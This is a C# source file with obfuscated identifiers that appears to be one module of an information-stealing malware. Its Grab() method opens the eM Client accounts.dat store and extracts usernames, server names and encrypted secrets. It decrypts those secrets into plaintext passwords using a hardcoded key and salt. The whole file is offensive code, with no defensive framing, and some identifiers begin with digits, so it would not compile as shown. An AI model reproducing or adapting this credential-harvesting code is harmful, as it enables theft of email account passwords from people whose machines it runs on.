using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using C6Zy;
using JSW1fecBOy;
using rCOGWW;

namespace rk937aHHc
{
	public class eM_Client : EtbH
	{
		public eM_Client()
		{
			this.DZRvm = "eM Client";
		}

		public string DZRvm { get; set; }
		public List<WTitxI2m> Grab()
		{
			List<WTitxI2m> list = new List<WTitxI2m>();

			string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string baseDir = Path.Combine(appData, "eM Client");
			string accountsPath = Path.Combine(baseDir, "accounts.dat");

			// accounts.dat 없으면 종료
			if (!File.Exists(accountsPath))
				return list;

			try
			{
				btrVogW db = new btrVogW(accountsPath);

				if (!db.f9NLCu("Accounts"))
					return list;

				for (int i = 0; i < db.unm(); i++)
				{
					try
					{
						string accountDir = db.68OQjJrpl(i, 0);
						string jsonData = db.68OQjJrpl(i, 1);

						string accountPath = Path.Combine(baseDir, accountDir);
						if (!Directory.Exists(accountPath))
							continue;

						string username = g3Vt7T2gk5.1b9(jsonData, "\"Username\":\"", "\",", 0);
						string secret = g3Vt7T2gk5.1b9(jsonData, "\"Secret\":\"", "\",", 0);
						string host = g3Vt7T2gk5.1b9(jsonData, "\"ProviderName\":\"", "\",", 0);

						secret = Regex.Unescape(secret);

						string password = eM_Client.DlDG(
							secret,
							"72905C47-F4FD-4CF7-A489-4E8121A155BD"
						);

						list.Add(new WTitxI2m
						{
							data1 = host,
							data2 = username,
							data3 = password,
							data4 = this.DZRvm
						});
					}
					catch
					{
					}
				}
			}
			catch
			{
				return list;
			}

			return list;
		}

		private static string DlDG(string encryptedBase64, string password)
		{
			string result = null;
			RijndaelManaged aes = null;

			try
			{
				var kdf = new Rfc2898DeriveBytes(
					password,
					Encoding.ASCII.GetBytes("o6806642kbM7c5")
				);

				using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(encryptedBase64)))
				{
					aes = new RijndaelManaged
					{
						Key = kdf.GetBytes(256 / 8),
						IV = eM_Client.Wqc7LRbv54M(ms)
					};

					using (ICryptoTransform decryptor = aes.CreateDecryptor())
					using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
					using (StreamReader sr = new StreamReader(cs))
					{
						result = sr.ReadToEnd();
					}
				}
			}
			catch
			{
			}
			finally
			{
				aes?.Clear();
			}

			return result;
		}

		private static byte[] Wqc7LRbv54M(Stream stream)
		{
			byte[] lengthBuffer = new byte[4];
			if (stream.Read(lengthBuffer, 0, 4) != 4)
				return null;

			int ivLength = BitConverter.ToInt32(lengthBuffer, 0);
			if (ivLength <= 0)
				return null;

			byte[] iv = new byte[ivLength];
			if (stream.Read(iv, 0, iv.Length) != iv.Length)
				return null;

			return iv;
		}

	}
}
